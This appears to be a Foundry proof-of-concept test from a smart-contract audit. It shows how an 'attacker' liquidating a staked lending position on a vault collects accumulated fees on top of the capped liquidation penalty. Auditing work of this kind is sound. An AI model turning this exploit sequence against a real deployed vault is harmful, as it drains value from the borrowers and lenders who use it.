      function test_staked_liquidation_fee_windfall() public {
          // [fork setup]
          uint256 tokenId = _mintAndDepositStakedPosition();
          uint256 debtBefore = _borrow(tokenId, 90e6); // 90 USDC

          vm.warp(block.timestamp + 30 days);

          _dropWETHPrice(5); // make loan unhealthy without fees

          uint256 attackerUSDCBefore = usdc.balanceOf(attacker);
          vm.prank(attacker);
          usdc.approve(address(vault), type(uint256).max);
          (uint256 a0, uint256 a1) = vault.liquidate(LiquidateParams(tokenId, attacker, 0, 0, block.timestamp));

          uint256 attackerGained = _valueInUSDC(a0, a1);
          uint256 attackerNet = attackerGained - (attackerUSDCBefore - usdc.balanceOf(attacker));

          // attackerNet should equal ~10% penalty (MAX_LIQUIDATION_PENALTY)
          // but will equal penalty + all accumulated fees
          uint256 expectedMaxProfit = debtBefore * MAX_LIQUIDATION_PENALTY_X32 / Q32;
          assertGt(attackerNet, expectedMaxProfit, "liquidator profit exceeds intended penalty");
      }

